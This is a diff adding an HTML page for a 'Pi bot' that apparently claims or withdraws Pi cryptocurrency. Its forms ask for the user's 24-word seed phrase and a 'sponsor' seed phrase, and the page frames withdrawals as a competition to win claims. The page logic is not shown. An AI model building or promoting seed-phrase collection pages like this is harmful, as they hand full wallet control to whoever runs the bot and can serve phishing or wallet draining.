@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Pi Bot - Competition Crusher</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header with time -->
+        <header class="header">
+            <h1>🚀 ULTIMATE PI BOT</h1>
+            <div class="time-display">
+                <span id="currentTime"></span>
+            </div>
+            <div class="status-indicator">
+                <span id="botStatus">OFFLINE</span>
+            </div>
+        </header>
+
+        <!-- Toggle Section -->
+        <div class="toggle-section">
+            <button id="loginTab" class="tab-button active">LOGIN</button>
+            <button id="withdrawTab" class="tab-button">WITHDRAW</button>
+        </div>
+
+        <!-- Login Page -->
+        <div id="loginPage" class="page active">
+            <div class="card">
+                <h2>🔐 Wallet Login</h2>
+                <div class="form-group">
+                    <label>Seed Phrase (24 words)</label>
+                    <textarea id="seedPhrase" placeholder="Enter your 24-word seed phrase..." rows="3"></textarea>
+                </div>
+                <button id="loginButton" class="btn primary">LOGIN TO ULTIMATE BOT</button>
+            </div>
+        </div>
+
+        <!-- Withdraw Page -->
+        <div id="withdrawPage" class="page">
+            <!-- Balance Display -->
+            <div class="card">
+                <h2>💰 Available Balance</h2>
+                <div class="balance-display">
+                    <span id="availableBalance">0.0000000</span> PI
+                </div>
+                <button id="refreshBalance" class="btn secondary small">Refresh</button>
+            </div>
+
+            <!-- Withdrawal Form -->
+            <div class="card">
+                <h2>💸 Withdrawal</h2>
+                
+                <div class="form-group">
+                    <label>Withdrawal Address</label>
+                    <input type="text" id="withdrawalAddress" placeholder="GXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX">
+                </div>
+
+                <div class="form-group">
+                    <label>Locked Balance</label>
+                    <select id="lockedBalance">
+                        <option value="">Select locked balance...</option>
+                    </select>
+                    <button id="refreshLocked" class="btn secondary small">Refresh</button>
+                </div>
+
+                <div class="form-group">
+                    <label>Amount (PI)</label>
+                    <input type="number" id="withdrawAmount" placeholder="0.0000000" step="0.0000001">
+                </div>
+
+                <div class="form-group">
+                    <label>Sponsor Seed Phrase (For Claiming Fees)</label>
+                    <textarea id="sponsorPhrase" placeholder="Enter sponsor 24-word seed phrase..." rows="2"></textarea>
+                </div>
+
+                <div class="button-group">
+                    <button id="withdrawButton" class="btn primary">💸 WITHDRAW</button>
+                    <button id="claimButton" class="btn ultimate">⚡ ULTIMATE CLAIM</button>
+                </div>
+            </div>
+
+            <!-- Recent Transactions -->
+            <div class="card">
+                <h2>📋 Recent Transactions</h2>
+                <div id="recentTransactions" class="transaction-list">
+                    <div class="no-transactions">No transactions yet</div>
+                </div>
+            </div>
+
+            <!-- Live Logs -->
+            <div class="card">
+                <h2>📊 Live Bot Logs</h2>
+                <div class="log-controls">
+                    <button id="startMonitoring" class="btn success">START MONITORING</button>
+                    <button id="stopMonitoring" class="btn danger">STOP MONITORING</button>
+                    <button id="clearLogs" class="btn secondary">CLEAR LOGS</button>
+                </div>
+                <div id="liveLogs" class="log-container">
+                    <div class="log-entry info">
+                        <span class="timestamp">[2025-08-07 21:59:38]</span>
+                        <span class="message">🚀 ULTIMATE PI BOT READY - COMPETITION CRUSHER MODE</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Performance Metrics -->
+            <div class="card">
+                <h2>🏆 Performance Metrics</h2>
+                <div class="metrics-grid">
+                    <div class="metric">
+                        <label>Competition Wins</label>
+                        <span id="competitionWins">0</span>
+                    </div>
+                    <div class="metric">
+                        <label>Total Claimed</label>
+                        <span id="totalClaimed">0.0000000 PI</span>
+                    </div>
+                    <div class="metric">
+                        <label>Network Dominance</label>
+                        <span id="networkDominance">0%</span>
+                    </div>
+                    <div class="metric">
+                        <label>Threat Level</label>
+                        <span id="threatLevel">LOW</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
